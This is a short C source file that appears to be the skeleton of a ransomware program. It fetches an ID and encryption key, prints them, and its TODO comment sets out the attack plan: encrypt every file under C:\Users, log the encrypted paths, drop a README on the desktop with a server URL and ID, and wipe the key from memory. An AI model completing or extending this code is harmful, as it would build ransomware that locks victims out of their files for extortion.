#include <stdio.h>
#include "utils.h"

int main() {
    int id;
    char key[65];

    get_key(&id, key);

    printf("ID: %d\n", id);
    printf("Key: %s\n", key);

    /*TODO:
        write a README on user desktop with server url and id
        foreach files != (README.txt || paths.txt) from 'C:\Users' call encrypt(filepath, key)
            success   -> add filepath to paths.txt 
            exception ->  pass
        delete key from memory
    */
    return 0;
}
